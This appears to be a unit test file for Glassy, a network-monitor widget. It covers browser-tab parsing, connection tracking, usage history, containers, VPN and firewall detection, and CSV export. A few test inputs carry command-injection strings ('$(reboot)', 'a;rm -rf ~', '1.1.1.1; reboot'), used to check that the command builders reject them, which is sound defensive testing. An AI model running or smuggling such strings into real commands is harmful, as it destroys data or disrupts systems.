        const json = BrowserTabs.mozlz4(BrowserTabs.base64Bytes(geckoSession));
        const tabs = BrowserTabs.geckoTabs(json, "Zen");
        compare(tabs.map(t => t.host), ["www.example.org", "github.com", "de.wikipedia.org"], "the current entry of every web tab");
        compare(tabs[0].title, "Example page – café \u{1F3A7}");
        compare(tabs[0].browser, "Zen");
        let failed = false;
        try {
            BrowserTabs.mozlz4(BrowserTabs.base64Bytes("bm90IGx6NA=="));
        } catch (e) {
            failed = true;
        }
        verify(failed, "anything else is refused");
        compare(BrowserTabs.browserName("/home/a/.zen/x.Default/sessionstore-backups/recovery.jsonlz4"), "Zen");
        compare(BrowserTabs.browserName("/home/a/.config/BraveSoftware/Brave-Browser/Default/Sessions/Session_1"), "Brave");
    }
    function test_tabsMatchBrowserConnectionsByAddress() {
        const out = BrowserTabs.parseTabsOutput("@@gecko 1700000000 /h/.mozilla/firefox/p/sessionstore-backups/recovery.jsonlz4\nsame\n@@chromium 0 /h/.config/chromium/Default/Sessions/Session_9\n     12 https://news.example.com\n      3 http://example.net\n");
        compare(out.length, 2);
        compare(out[0].body, "same");
        compare(BrowserTabs.chromiumTabs(out[1].body, "Chromium").map(t => t.host), ["news.example.com", "example.net"]);
        compare(BrowserTabs.parseForward("addr\twww.example.org\t93.184.215.14\naddr\twww.example.org\t2606:2800:21f:cb07:6820:80da:af6b:8b2c\naddr\twww.example.org\t93.184.215.14\n")["www.example.org"].length, 2);
        const sites = BrowserTabs.siteIndex([
            {
                host: "a.example",
                title: "A"
            },
            {
                host: "b.example",
                title: "B"
            }
        ], {
            "a.example": ["1.1.1.1"],
            "b.example": ["1.1.1.1", "2.2.2.2"]
        });
        compare(sites["1.1.1.1"].map(t => t.host), ["a.example", "b.example"], "a shared address lists every candidate");
        const conn = ip => ({
                    ip: ip,
                    proc: "Isolated Web Co",
                    app: {
                        name: "Firefox"
                    }
                });
        const d = NetModel.describe(conn("1.1.1.1"), {
            "1.1.1.1": {
                name: "cdn.example.net",
                country: "US",
                asn: 1,
                org: "X"
            }
        }, sites);
        compare([d.site, d.siteMore, d.domain, d.host], ["a.example", 1, "a.example", "cdn.example.net"]);
        compare(NetModel.describe({
            ip: "1.1.1.1",
            proc: "curl",
            app: {
                name: "curl"
            }
        }, {}, sites).site, "", "only browsers get a tab");
        const cmd = BrowserTabs.tabsCmd(["/h/.mozilla/firefox/p/sessionstore-backups/recovery.jsonlz4:1700000000", "/h/x$(reboot):1"]);
        verify(cmd.indexOf("recovery.jsonlz4:1700000000") !== -1);
        verify(cmd.indexOf("reboot") === -1);
        verify(BrowserTabs.forwardCmd(["github.com", "a;rm -rf ~"]).indexOf("rm -rf") === -1);
    }
    function test_historyRecordsPerDayHourAppDomainCountry() {
        const t = new Date(2026, 8, 23, 14, 30).getTime();
        const h = NetHistory.empty();
        const app = {
            key: "app:firefox",
            name: "Firefox",
            icon: "firefox"
        };
        NetHistory.record(h, {
            time: t,
            totalIn: 1000,
            totalOut: 100,
            conns: [
                {
                    app: app,
                    domain: "example.org",
                    country: "DE",
                    deltaIn: 600,
                    deltaOut: 50,
                    isNew: true
                },
                {
                    app: app,
                    domain: "example.org",
                    country: "DE",
                    deltaIn: 0,
                    deltaOut: 0,
                    isNew: false
                }
            ]
        });
        NetHistory.record(h, {
            time: t + 86400000,
            totalIn: 10,
            totalOut: 1,
            conns: []
        });
        const d = h.days["2026-09-23"];
        compare([d["in"], d.out, d.hours[14][0], d.hours[13][0]], [1000, 100, 1000, 0]);
        compare(d.apps["app:firefox"], {
            name: "Firefox",
            icon: "firefox",
            "in": 600,
            out: 50,
            conns: 1
        });
        compare(d.domains["example.org"], [600, 50, 1]);
        compare(d.countries.DE, [600, 50]);
        const week = NetHistory.summary(h, t + 86400000, 7);
        compare(week.days.length, 7);
        compare(week.days[6].day, "2026-09-24");
        compare(week.total["in"], 1010);
        compare(week.apps[0].name, "Firefox");
        compare(NetHistory.summary(h, t, 1).hours[14], [1000, 100]);
    }
    function test_historyFilesAreCheckedBeforeUse() {
        compare(NetHistory.migrate(null).writable, true, "no file yet: start one");
        const bad = NetHistory.migrate({
            some: "thing"
        });
        verify(!bad.writable && bad.error !== "", "a foreign file is never overwritten");
        const newer = NetHistory.migrate({
            format: NetHistory.FORMAT,
            version: 99,
            days: {}
        });
        verify(!newer.writable, "a newer Glassy's file is read-only here");
        const fixed = NetHistory.migrate({
            format: NetHistory.FORMAT,
            version: 1,
            days: {
                "2026-09-01": {
                    "in": "5",
                    apps: {}
                },
                "garbage": {}
            }
        });
        verify(fixed.writable);
        compare(Object.keys(fixed.history.days), ["2026-09-01"]);
        compare(fixed.history.days["2026-09-01"]["in"], 5);
        compare(fixed.history.days["2026-09-01"].hours.length, 24);
        const now = new Date(2026, 8, 23).getTime();
        const old = NetHistory.migrate({
            format: NetHistory.FORMAT,
            version: 1,
            days: {
                "2026-01-01": {},
                "2026-09-22": {}
            }
        }).history;
        const many = old.days["2026-09-22"].apps;
        for (let i = 0; i < 100; i++)
            many["app:" + i] = {
                name: "a" + i,
                icon: "",
                "in": i,
                out: 0,
                conns: 0
            };
        NetHistory.prune(old, now, "90d");
        compare(Object.keys(old.days), ["2026-09-22"], "days beyond the retention go");
        compare(Object.keys(old.days["2026-09-22"].apps).length, NetHistory.MAX_ENTRIES);
        verify(!!old.days["2026-09-22"].apps["app:99"], "the busiest stay");
        const demo = NetHistory.migrate(DemoData.netHistory(now));
        verify(demo.writable);
        compare(NetHistory.summary(demo.history, now, 30).days.filter(d => d["in"] > 0).length, 30);
        const kept = NetHistory.migrate(DemoData.netHistory(now)).history;
        const pruned = NetHistory.prune(kept, now, "all");
        compare(Object.keys(kept.days).length, 420, "keep: forever");
        verify(kept.days["2025-09-01"].compact && kept.days["2025-09-01"].hours === null, "old days lose their hours");
        verify(Object.keys(kept.days["2025-09-01"].apps).length <= NetHistory.COMPACT_ENTRIES);
        const year = NetHistory.migrate(DemoData.netHistory(now)).history;
        const r = NetHistory.prune(year, now, "1y");
        compare(Object.keys(year.days).length, 366);
        verify(r.removed["2025-08"], "a month with no day left is deleted as a file");
    }
    function test_trackReportsBytesSinceTheLastPollOnce() {
        const socket = (port, sent, received) => Probes.parseConnections("tcp ESTAB 0 0 10.0.0.2:" + port + " 1.2.3.4:443 users:((\"curl\",pid=7,fd=3))\n\t cubic rtt:10/2 cwnd:10 bytes_sent:" + sent + " bytes_acked:" + sent + " bytes_received:" + received)[0];
        let s = NetModel.track(null, [socket(5000, 100, 1000)], 0, {});
        compare([s.list[0].deltaIn, s.list[0].isNew], [0, true], "the first poll after a restart counts nothing old");
        s = NetModel.track(s, [socket(5000, 150, 1500), socket(5001, 10, 20)], 2000, {});
        compare([s.list[0].deltaIn, s.list[0].deltaOut, s.list[0].isNew], [500, 50, false]);
        compare([s.list[1].deltaIn, s.list[1].isNew], [20, true], "a new connection brings what it moved so far");
        const sample = NetModel.historySample(s.list, 2000, {
            inBytes: 900,
            outBytes: 90
        }, {}, {});
        compare(sample.totalIn, 900);
        compare(sample.conns.map(c => c.deltaIn), [500, 20]);
        compare(sample.conns[0].domain, "1.2.3.4", "no name yet: the address");
        s = NetModel.track(s, [], 4000, {
            maxEnded: 0
        });
        compare(s.list.length, 0, "the background poll keeps no ended ones");
    }

    function test_historySplitsIntoTodayAndPastFiles() {
        const now = new Date(2026, 8, 23, 12).getTime();
        const h = DemoData.netHistory(now);
        const files = NetHistory.split(h, now);
        compare(files.today.day, "2026-09-23");
        verify(!files.months["2026-09"].days["2026-09-23"], "today is not in a month file");
        compare(Object.keys(files.months).length, 15, "fourteen months of demo data, one file each");
        const months = Object.values(JSON.parse(JSON.stringify(files.months)));
        const back = NetHistory.join({
            legacy: null,
            months: months,
            today: JSON.parse(JSON.stringify(files.today))
        });
        verify(back.writable);
        compare(Object.keys(back.history.days).length, 420);
        compare(back.history.days["2026-09-23"]["in"], h.days["2026-09-23"]["in"]);
        compare(NetHistory.join({
            months: months,
            today: null
        }).history.days["2026-09-23"], undefined, "no today file yet: fine");
        verify(!NetHistory.join({
            months: months,
            today: {
                format: "other"
            }
        }).writable, "a foreign today file is never overwritten");
        verify(!NetHistory.join({
            months: [
                {
                    format: "other"
                }
            ]
        }).writable, "nor a foreign month file");
        verify(JSON.stringify(files.today).length < 12000, "the file saved every five minutes stays small");
        verify(JSON.stringify(files.months["2025-09"]).length < 60000, "an old, compact month stays small");
    }
    function test_containersFromDockerAndPodman() {
        const e = Probes.parseContainers(DemoData.NET_CONTAINERS);
        compare(Object.keys(e), ["docker", "podman"]);
        const web = e.docker.containers[0];
        compare([web.name, web.image, web.state], ["web", "nginx:1.27-alpine", "running"]);
        compare(web.ports.map(p => p.hostIp + ":" + p.hostPort + "->" + p.containerPort), ["0.0.0.0:8080->80", ":::8080->80"]);
        compare(web.ips, {
            bridge: "172.17.0.2",
            front: "172.20.0.3"
        });
        compare(e.docker.networks.map(n => n.iface), ["docker0", "br-5d3a9c0e1f22", ""]);
        compare(e.podman.containers[0].ports[0], {
            hostIp: "127.0.0.1",
            hostPort: "6379",
            containerPort: "6379",
            proto: "tcp"
        });
        compare(e.podman.networks[0].iface, "podman0");
        compare(Probes.containerForPort(e, "tcp", "8080").container.name, "web");
        compare(Probes.containerForPort(e, "udp", "8080"), null);
        const denied = Probes.parseContainers("@@engine docker\npermission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock\n@@inspect docker\n@@networks docker\n");
        compare(denied.docker.containers.length, 0);
        verify(/permission denied/.test(denied.docker.error));
        const stats = Probes.parseContainerStats(DemoData.netContainerStats(10));
        verify(stats["docker:web"].rx > 4e6);
        compare(Probes.sizeBytes("1.5kB"), 1500);
        compare(Probes.sizeBytes("2MiB"), 2097152);
        compare(Probes.sizeBytes("0B"), 0);
        const groups = NetModel.listeningByApp(Probes.parseListening(Probes.sections(DemoData.netPoll(1))[""]), {}, {}, e);
        const g = groups.find(x => x.key === "container:docker:web");
        compare(g.rows.length, 2, "docker-proxy's ports group under the container");
        compare(g.rows[0].containerPort, "80");
    }
    function test_geoStatusAndCommands() {
        const st = Probes.parseGeoStatus("mm /usr/bin/mmdblookup\ncountry /home/a/.local/share/GeoIP/dbip-country-lite.mmdb 1790000000\nasn \nfetch curl\n");
        compare(st.mmdblookup, "/usr/bin/mmdblookup");
        compare(st.country, "/home/a/.local/share/GeoIP/dbip-country-lite.mmdb");
        compare(st.countryTime, 1790000000000);
        compare(st.asn, "");
        compare(st.fetch, "curl");
        verify(Probes.GEO_COUNTRY_DBS[0] === "$GLASSY_GEOIP_COUNTRY", "the Nix module's path comes first");
        verify(Probes.GEO_COUNTRY_DBS.indexOf("/run/current-system/sw/share/dbip/dbip-country-lite.mmdb") !== -1);
        verify(Probes.resolveCmd(["1.1.1.1"]).indexOf("$GLASSY_GEOIP_ASN") !== -1);
    }
    function test_netAppsPillReading() {
        const cfg = {
            panelSections: "cpu,netapps,bogus"
        };
        compare(Sections.panelIds(cfg), ["cpu", "netapps"]);
        compare(Sections.parse("netapps", 2), ["cpu"], "never a card section");
        const idle = SectionModels.pill("netapps", {}, {});
        compare(idle.lines[0].text, "—");
        const busy = SectionModels.pill("netapps", {
            netApps: {
                top: {
                    name: "Firefox",
                    rateIn: 2048,
                    rateOut: 10
                },
                count: 9,
                history: [1, 2048]
            }
        }, {});
        compare(busy.label, "Apps");
        compare(busy.lines[0].text, "Firefox");
        verify(busy.lines[1].text.indexOf("· 9") !== -1);
        compare(busy.history, [1, 2048]);
    }

    function test_timelinePeriodsStepAndDrill() {
        const now = new Date(2026, 8, 23, 15).getTime();
        const h = NetHistory.migrate(DemoData.netHistory(now)).history;
        const week = NetHistory.period(h, "week", now, now);
        compare(week.buckets.length, 7);
        compare(week.title, "Week of 21 Sep 2026");
        compare(week.keys[0], "2026-09-21");
        verify(!week.canForward, "nothing after this week yet");
        compare(week.buckets[2].drill.kind, "day");
        const lastWeek = NetHistory.period(h, "week", NetHistory.shift("week", now, -1), now);
        verify(lastWeek.canForward);
        compare(lastWeek.keys[0], "2026-09-14");
        const month = NetHistory.period(h, "month", NetHistory.shift("month", now, -1), now);
        compare([month.title, month.buckets.length], ["Aug 2026", 31]);
        const year = NetHistory.period(h, "year", now, now);
        compare(year.buckets.length, 12);
        compare(year.buckets[8].drill.kind, "month");
        verify(year.buckets[8]["in"] > 0 && year.buckets[11]["in"] === 0);
        const all = NetHistory.period(h, "all", now, now);
        compare(all.buckets.length, 15);
        compare(all.title, "All time");
        const day = NetHistory.period(h, "day", now, now);
        compare(day.buckets.length, 24);
        const sum = NetHistory.summarize(h, week.keys);
        compare(sum.total.days, 3);
        compare(sum.ifaces[0].key, "wlp2s0", "#9: usage per interface");
        compare(NetHistory.shift("month", new Date(2026, 0, 31, 12).getTime(), 1), new Date(2026, 1, 1, 12).getTime(), "no month skipped from the 31st");
        compare(NetHistory.appToday(h, now, "app:steam") > 0, true);
        compare(NetHistory.firstSeen(h)["app:steam"], NetHistory.dayKey(now - 419 * 86400000));
    }
    function test_vpnFirewallAndRoute() {
        compare(Probes.vpnProvider("nordlynx", []), "NordVPN (NordLynx)");
        compare(Probes.vpnProvider("tailscale0", []), "Tailscale");
        compare(Probes.vpnProvider("wg0", ["mullvad-daemon"]), "Mullvad (WireGuard)");
        compare(Probes.vpnProvider("tun0", ["openvpn"]), "OpenVPN (OpenVPN)");
        compare(Probes.vpnProvider("proton0", []), "Proton VPN");
        compare(Probes.vpnProvider("wg0", []), "WireGuard");
        const ctx = {
            index: Probes.appIndex(Probes.parseDesktopEntries(DemoData.NET_DESKTOP))
        };
        const ifaces = Probes.parseInterfaces(DemoData.NET_INTERFACES), details = Probes.parseIfaceDetails(DemoData.NET_IFACE_DETAILS);
        const addresses = Probes.addressIndex(ifaces, details);
        compare(addresses["10.8.0.2"], "wg0");
        compare(addresses["192.168.1.23"], "wlp2s0");
        const parts = Probes.sections(DemoData.netPoll(5));
        ctx.tree = Probes.parseProcTree(parts.proc);
        ctx.ifaceOf = ip => addresses[ip] || "";
        const s = NetModel.track(null, Probes.parseConnections(parts[""]), 1000, ctx);
        const vpns = Probes.vpnInfo(ifaces, details, ctx.tree, s.list);
        compare(vpns.length, 1);
        compare(vpns[0].provider, "Mullvad (WireGuard)");
        compare(vpns[0].conns, 2, "two connections use the tunnel's address");
        verify(vpns[0].direct.indexOf("Steam") !== -1, "the rest leave directly");
        const fw = Probes.parseFirewall(DemoData.NET_FIREWALL);
        compare(fw.kind, "nixos");
        compare(Probes.firewallVerdict(fw, "tcp", "22"), "allowed");
        compare(Probes.firewallVerdict(fw, "udp", "1716"), "allowed");
        compare(Probes.firewallVerdict(fw, "tcp", "8080"), "blocked");
        compare(Probes.firewallVerdict(Probes.parseFirewall("unit ufw active\n"), "tcp", "22"), "", "ufw rules need root: unknown");
        compare(Probes.firewallVerdict(Probes.parseFirewall("unit firewalld inactive\n"), "tcp", "22"), "open");
        const fd = Probes.parseFirewall("unit firewalld active\nzone public\nservices ssh kdeconnect\nports 8080/tcp\n");
        compare([Probes.firewallVerdict(fd, "tcp", "22"), Probes.firewallVerdict(fd, "tcp", "1740"), Probes.firewallVerdict(fd, "tcp", "5432")], ["allowed", "allowed", "blocked"]);
        verify(Probes.FIREWALL_CMD.indexOf("sudo") === -1 && Probes.FIREWALL_CMD.indexOf("pkexec") === -1, "never asks for a password");
        compare(Probes.parseTrace(" 1?: [LOCALHOST]   pmtu 1500\n 1:  192.168.1.1   2.345ms\n 2:  no reply\n 3:  100.64.0.1   12.1ms asymm  4\n     Resume: pmtu 1500 hops 3 back 3").map(x => [x.hop, x.ip, x.ms]), [[1, "192.168.1.1", 2.345], [2, "", -1], [3, "100.64.0.1", 12.1]]);
        compare(Probes.parseTrace("traceroute to 1.1.1.1\n 1  192.168.1.1  1.234 ms\n 2  *\n 3  1.1.1.1  9.8 ms").length, 3);
        compare(Probes.traceCmd("1.1.1.1; reboot"), "echo bad address");
        compare(Probes.parseDns("@@servers\nGlobal: 1.1.1.1\nLink 3 (wlp2s0): 9.9.9.9\n").viaResolved, true);
    }
    function test_passwordLockAndExport() {
        compare(NetLock.sha256("abc"), "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
        compare(NetLock.sha256(""), "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855");
        const lock = NetLock.create("hunter2");
        verify(lock.hash !== "hunter2" && lock.salt.length === 32, "only a salted hash is kept");
        verify(NetLock.check(lock, "hunter2"));
        verify(!NetLock.check(lock, "hunter3"));
        verify(NetLock.check(null, "anything"), "no lock: open");
        const csvText = NetModel.connectionsCsv([
            {
                app: {
                    name: "A \"quoted\", app"
                },
                proc: "a",
                pid: 1,
                proto: "tcp",
                direction: "out",
                state: "ESTAB",
                localIp: "10.0.0.2",
                localPort: "5000",
                ip: "1.2.3.4",
                port: "443",
                kind: "internet",
                via: "wg0",
                bytesIn: 10,
                bytesOut: 5,
                rtt: 12.5,
                since: 0,
                ended: false
            }
        ], {}, {});
        verify(csvText.split("\n")[1].indexOf("\"A \"\"quoted\"\", app\"") === 0, "CSV cells are quoted");
        const h = NetModel.historyCsv(NetHistory.migrate(DemoData.netHistory(new Date(2026, 8, 23).getTime())).history);
        verify(h.split("\n")[0] === "day,app,bytes_in,bytes_out,connections");
        verify(h.indexOf("2026-09-23,(total),") !== -1);
    }
}
